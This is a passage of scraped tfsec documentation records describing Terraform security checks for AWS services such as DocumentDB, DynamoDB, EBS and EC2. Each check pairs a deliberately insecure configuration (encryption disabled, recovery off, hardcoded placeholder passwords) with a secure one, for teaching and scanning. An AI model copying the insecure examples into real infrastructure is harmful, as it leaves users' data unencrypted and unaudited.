[https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:53.914511"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudwatch/log-group-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudwatch/log-group-customer-key/index.md", "content": "---\ntitle: CloudWatch log groups should be encrypted using CMK\n---\n\n# CloudWatch log groups should be encrypted using CMK\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nCloudWatch log groups are encrypted by default, however, to get the full benefit of controlling key rotation and other KMS aspects a KMS CMK should be used.\n\n### Possible Impact\nLog data may be leaked if the logs are compromised. No auditing of who have viewed the logs.\n\n### Suggested Resolution\nEnable CMK encryption of CloudWatch Log Groups\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudwatch-log-group-customer-key check.\n```terraform\n\n resource \"aws_cloudwatch_log_group\" \"bad_example\" {\n \tname = \"bad_example\"\n \n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudwatch-log-group-customer-key check.\n```terraform\n\n resource \"aws_cloudwatch_log_group\" \"good_example\" {\n \tname = \"good_example\"\n \n \tkms_key_id = aws_kms_key.log_key.arn\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/encrypt-log-data-kms.html](https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/encrypt-log-data-kms.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:54.526753"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/codebuild/enable-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/codebuild/enable-encryption/index.md", "content": "---\ntitle: CodeBuild Project artifacts encryption should not be disabled\n---\n\n# CodeBuild Project artifacts encryption should not be disabled\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAll artifacts produced by your CodeBuild project pipeline should always be encrypted\n\n### Possible Impact\nCodeBuild project artifacts are unencrypted\n\n### Suggested Resolution\nEnable encryption for CodeBuild project artifacts\n\n\n### Insecure Example\n\nThe following example will fail the aws-codebuild-enable-encryption check.\n```terraform\n\n resource \"aws_codebuild_project\" \"bad_example\" {\n \t// other config\n \n \tartifacts {\n \t\t// other artifacts config\n \n \t\tencryption_disabled = true\n \t}\n }\n \n resource \"aws_codebuild_project\" \"bad_example\" {\n \t// other config including primary artifacts\n \n \tsecondary_artifacts {\n \t\t// other artifacts config\n \t\t\n \t\tencryption_disabled = false\n \t}\n \n \tsecondary_artifacts {\n \t\t// other artifacts config\n \n \t\tencryption_disabled = true\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-codebuild-enable-encryption check.\n```terraform\n\n resource \"aws_codebuild_project\" \"good_example\" {\n \t// other config\n \n \tartifacts {\n \t\t// other artifacts config\n \n \t\tencryption_disabled = false\n \t}\n }\n \n resource \"aws_codebuild_project\" \"good_example\" {\n \t// other config\n \n \tartifacts {\n \t\t// other artifacts config\n \t}\n }\n \n resource \"aws_codebuild_project\" \"codebuild\" {\n \t// other config\n \n \tsecondary_artifacts {\n \t\t// other artifacts config\n \n \t\tencryption_disabled = false\n \t}\n \n \tsecondary_artifacts {\n \t\t// other artifacts config\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-codebuild-project-artifacts.html](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-codebuild-project-artifacts.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:54.970951"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/config/aggregate-all-regions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/config/aggregate-all-regions/index.md", "content": "---\ntitle: Config configuration aggregator should be using all regions for source\n---\n\n# Config configuration aggregator should be using all regions for source\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nThe configuration aggregator should be configured with all_regions for the source. \n\nThis will help limit the risk of any unmonitored configuration in regions that are thought to be unused.\n\n### Possible Impact\nSources that aren't covered by the aggregator are not include in the configuration\n\n### Suggested Resolution\nSet the aggregator to cover all regions\n\n\n### Insecure Example\n\nThe following example will fail the aws-config-aggregate-all-regions check.\n```terraform\n\n resource \"aws_config_configuration_aggregator\" \"bad_example\" {\n \tname = \"example\"\n \t  \n \taccount_aggregation_source {\n \t  account_ids = [\"123456789012\"]\n \t  regions     = [\"us-west-2\", \"eu-west-1\"]\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-config-aggregate-all-regions check.\n```terraform\n\n resource \"aws_config_configuration_aggregator\" \"good_example\" {\n \tname = \"example\"\n \t  \n \taccount_aggregation_source {\n \t  account_ids = [\"123456789012\"]\n \t  all_regions = true\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/config/latest/developerguide/aggregate-data.html](https://docs.aws.amazon.com/config/latest/developerguide/aggregate-data.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:55.740292"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/documentdb/enable-log-export/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/documentdb/enable-log-export/index.md", "content": "---\ntitle: DocumentDB logs export should be enabled\n---\n\n# DocumentDB logs export should be enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDocument DB does not have auditing by default. To ensure that you are able to accurately audit the usage of your DocumentDB cluster you should enable export logs.\n\n### Possible Impact\nLimited visibility of audit trail for changes to the DocumentDB\n\n### Suggested Resolution\nEnable export logs\n\n\n### Insecure Example\n\nThe following example will fail the aws-documentdb-enable-log-export check.\n```terraform\n\n resource \"aws_docdb_cluster\" \"bad_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   enabled_cloudwatch_logs_exports = \"something\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-documentdb-enable-log-export check.\n```terraform\n\n resource \"aws_docdb_cluster\" \"good_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   enabled_cloudwatch_logs_exports = \"audit\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/documentdb/latest/developerguide/event-auditing.html](https://docs.aws.amazon.com/documentdb/latest/developerguide/event-auditing.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:56.341521"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/documentdb/enable-storage-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/documentdb/enable-storage-encryption/index.md", "content": "---\ntitle: DocumentDB storage must be encrypted\n---\n\n# DocumentDB storage must be encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEncryption of the underlying storage used by DocumentDB ensures that if their is compromise of the disks, the data is still protected.\n\n### Possible Impact\nUnencrypted sensitive data is vulnerable to compromise.\n\n### Suggested Resolution\nEnable storage encryption\n\n\n### Insecure Example\n\nThe following example will fail the aws-documentdb-enable-storage-encryption check.\n```terraform\n\n resource \"aws_docdb_cluster\" \"bad_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   storage_encrypted = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-documentdb-enable-storage-encryption check.\n```terraform\n\n resource \"aws_docdb_cluster\" \"good_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   storage_encrypted = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/documentdb/latest/developerguide/encryption-at-rest.html](https://docs.aws.amazon.com/documentdb/latest/developerguide/encryption-at-rest.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:56.670556"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/documentdb/encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/documentdb/encryption-customer-key/index.md", "content": "---\ntitle: DocumentDB encryption should use Customer Managed Keys\n---\n\n# DocumentDB encryption should use Customer Managed Keys\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nEncryption using AWS keys provides protection for your DocumentDB underlying storage. To increase control of the encryption and manage factors like rotation use customer managed keys.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nEnable encryption using customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-documentdb-encryption-customer-key check.\n```terraform\n\n resource \"aws_docdb_cluster\" \"docdb\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-documentdb-encryption-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"docdb_encryption\" {\n \tenable_key_rotation = true\n }\n \t\t\t\n resource \"aws_docdb_cluster\" \"docdb\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   kms_key_id \t\t\t  = aws_kms_key.docdb_encryption.arn\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/documentdb/latest/developerguide/security.encryption.ssl.public-key.html](https://docs.aws.amazon.com/documentdb/latest/developerguide/security.encryption.ssl.public-key.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:56.980186"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/documentdb/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/documentdb/index.md", "content": "---\ntitle: documentdb\n---\n\n# documentdb\n\n## Checks\n\n\n- [enable-log-export](enable-log-export) DocumentDB logs export should be enabled\n\n- [enable-storage-encryption](enable-storage-encryption) DocumentDB storage must be encrypted\n\n- [encryption-customer-key](encryption-customer-key) DocumentDB encryption should use Customer Managed Keys\n\n\n\n", "timestamp": "2025-10-24T22:23:57.095572"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/dynamodb/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/dynamodb/enable-at-rest-encryption/index.md", "content": "---\ntitle: DAX Cluster and tables should always encrypt data at rest\n---\n\n# DAX Cluster and tables should always encrypt data at rest\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAmazon DynamoDB Accelerator (DAX) and table encryption at rest provides an additional layer of data protection by helping secure your data from unauthorized access to the underlying storage.\n\n### Possible Impact\nData can be freely read if compromised\n\n### Suggested Resolution\nEnable encryption at rest for DAX Cluster\n\n\n### Insecure Example\n\nThe following example will fail the aws-dynamodb-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_dax_cluster\" \"bad_example\" {\n \t// no server side encryption at all\n }\n \n resource \"aws_dax_cluster\" \"bad_example\" {\n \t// other DAX config\n \n \tserver_side_encryption {\n \t\t// empty server side encryption config\n \t}\n }\n \n resource \"aws_dax_cluster\" \"bad_example\" {\n \t// other DAX config\n \n \tserver_side_encryption {\n \t\tenabled = false // disabled server side encryption\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-dynamodb-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_dax_cluster\" \"good_example\" {\n \t// other DAX config\n \n \tserver_side_encryption {\n \t\tenabled = true // enabled server side encryption\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DAXEncryptionAtRest.html](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DAXEncryptionAtRest.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-dax-cluster.html](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-dax-cluster.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:57.570766"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/dynamodb/enable-recovery/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/dynamodb/enable-recovery/index.md", "content": "---\ntitle: Point in time recovery should be enabled to protect DynamoDB table\n---\n\n# Point in time recovery should be enabled to protect DynamoDB table\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDynamoDB tables should be protected against accidentally or malicious write/delete actions by ensuring that there is adequate protection.\n\nBy enabling point-in-time-recovery you can restore to a known point in the event of loss of data.\n\n### Possible Impact\nAccidental or malicious writes and deletes can't be rolled back\n\n### Suggested Resolution\nEnable point in time recovery\n\n\n### Insecure Example\n\nThe following example will fail the aws-dynamodb-enable-recovery check.\n```terraform\n\n resource \"aws_dynamodb_table\" \"bad_example\" {\n \tname             = \"example\"\n \thash_key         = \"TestTableHashKey\"\n \tbilling_mode     = \"PAY_PER_REQUEST\"\n \tstream_enabled   = true\n \tstream_view_type = \"NEW_AND_OLD_IMAGES\"\n   \n \tattribute {\n \t  name = \"TestTableHashKey\"\n \t  type = \"S\"\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-dynamodb-enable-recovery check.\n```terraform\n\n resource \"aws_dynamodb_table\" \"good_example\" {\n \tname             = \"example\"\n \thash_key         = \"TestTableHashKey\"\n \tbilling_mode     = \"PAY_PER_REQUEST\"\n \tstream_enabled   = true\n \tstream_view_type = \"NEW_AND_OLD_IMAGES\"\n   \n \tattribute {\n \t  name = \"TestTableHashKey\"\n \t  type = \"S\"\n \t}\n \n \tpoint_in_time_recovery {\n \t\tenabled = true\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/PointInTimeRecovery.html](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/PointInTimeRecovery.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:57.854883"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/dynamodb/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/dynamodb/index.md", "content": "---\ntitle: dynamodb\n---\n\n# dynamodb\n\n## Checks\n\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) DAX Cluster and tables should always encrypt data at rest\n\n- [enable-recovery](enable-recovery) Point in time recovery should be enabled to protect DynamoDB table\n\n- [table-customer-key](table-customer-key) DynamoDB tables should use at rest encryption with a Customer Managed Key\n\n\n\n", "timestamp": "2025-10-24T22:23:57.961916"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/dynamodb/table-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/dynamodb/table-customer-key/index.md", "content": "---\ntitle: DynamoDB tables should use at rest encryption with a Customer Managed Key\n---\n\n# DynamoDB tables should use at rest encryption with a Customer Managed Key\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nDynamoDB tables are encrypted by default using AWS managed encryption keys. To increase control of the encryption and control the management of factors like key rotation, use a Customer Managed Key.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nEnable server side encryption with a customer managed key\n\n\n### Insecure Example\n\nThe following example will fail the aws-dynamodb-table-customer-key check.\n```terraform\n\n resource \"aws_dynamodb_table\" \"bad_example\" {\n \tname             = \"example\"\n \thash_key         = \"TestTableHashKey\"\n \tbilling_mode     = \"PAY_PER_REQUEST\"\n \tstream_enabled   = true\n \tstream_view_type = \"NEW_AND_OLD_IMAGES\"\n   \n \tattribute {\n \t  name = \"TestTableHashKey\"\n \t  type = \"S\"\n \t}\n   \n \treplica {\n \t  region_name = \"us-east-2\"\n \t}\n   \n \treplica {\n \t  region_name = \"us-west-2\"\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-dynamodb-table-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"dynamo_db_kms\" {\n \tenable_key_rotation = true\n }\n \n resource \"aws_dynamodb_table\" \"good_example\" {\n \tname             = \"example\"\n \thash_key         = \"TestTableHashKey\"\n \tbilling_mode     = \"PAY_PER_REQUEST\"\n \tstream_enabled   = true\n \tstream_view_type = \"NEW_AND_OLD_IMAGES\"\n   \n \tattribute {\n \t  name = \"TestTableHashKey\"\n \t  type = \"S\"\n \t}\n   \n \treplica {\n \t  region_name = \"us-east-2\"\n \t}\n   \n \treplica {\n \t  region_name = \"us-west-2\"\n \t}\n \n \tserver_side_encryption {\n \t\tenabled     = true\n \t\tkms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n \t}\n   }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EncryptionAtRest.html](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EncryptionAtRest.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:58.273135"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ebs/enable-volume-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ebs/enable-volume-encryption/index.md", "content": "---\ntitle: EBS volumes must be encrypted\n---\n\n# EBS volumes must be encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nBy enabling encryption on EBS volumes you protect the volume, the disk I/O and any derived snapshots from compromise if intercepted.\n\n### Possible Impact\nUnencrypted sensitive data is vulnerable to compromise.\n\n### Suggested Resolution\nEnable encryption of EBS volumes\n\n\n### Insecure Example\n\nThe following example will fail the aws-ebs-enable-volume-encryption check.\n```terraform\n\n resource \"aws_ebs_volume\" \"bad_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ebs-enable-volume-encryption check.\n```terraform\n\n resource \"aws_ebs_volume\" \"good_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:58.724490"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ebs/encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ebs/encryption-customer-key/index.md", "content": "---\ntitle: EBS volume encryption should use Customer Managed Keys\n---\n\n# EBS volume encryption should use Customer Managed Keys\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nEncryption using AWS keys provides protection for your EBS volume. To increase control of the encryption and manage factors like rotation use customer managed keys.\n\n### Possible Impact\nUsing AWS managed keys does not allow for fine grained control\n\n### Suggested Resolution\nEnable encryption using customer managed keys\n\n\n### Insecure Example\n\nThe following example will fail the aws-ebs-encryption-customer-key check.\n```terraform\n\n resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ebs-encryption-customer-key check.\n```terraform\n\n resource \"aws_kms_key\" \"ebs_encryption\" {\n \tenable_key_rotation = true\n }\n \n resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n \n   kms_key_id = aws_kms_key.ebs_encryption.arn\n \n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:59.002595"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ebs/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ebs/index.md", "content": "---\ntitle: ebs\n---\n\n# ebs\n\n## Checks\n\n\n- [enable-volume-encryption](enable-volume-encryption) EBS volumes must be encrypted\n\n- [encryption-customer-key](encryption-customer-key) EBS volume encryption should use Customer Managed Keys\n\n\n\n", "timestamp": "2025-10-24T22:23:59.115996"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/add-description-to-security-group-rule/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/add-description-to-security-group-rule/index.md", "content": "---\ntitle: Missing description for security group rule.\n---\n\n# Missing description for security group rule.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSecurity group rules should include a description for auditing purposes.\n\nSimplifies auditing, debugging, and managing security groups.\n\n### Possible Impact\nDescriptions provide context for the firewall rule reasons\n\n### Suggested Resolution\nAdd descriptions for all security groups rules\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-add-description-to-security-group-rule check.\n```terraform\n\n resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n \n   ingress {\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-add-description-to-security-group-rule check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n \n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html](https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:59.577313"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/ec2/add-description-to-security-group/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/ec2/add-description-to-security-group/index.md", "content": "---\ntitle: Missing description for security group.\n---\n\n# Missing description for security group.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSecurity groups should include a description for auditing purposes.\n\nSimplifies auditing, debugging, and managing security groups.\n\n### Possible Impact\nDescriptions provide context for the firewall rule reasons\n\n### Suggested Resolution\nAdd descriptions for all security groups\n\n\n### Insecure Example\n\nThe following example will fail the aws-ec2-add-description-to-security-group check.\n```terraform\n\n resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n   description = \"\"\n \n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-ec2-add-description-to-security-group check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n \n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html](https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": 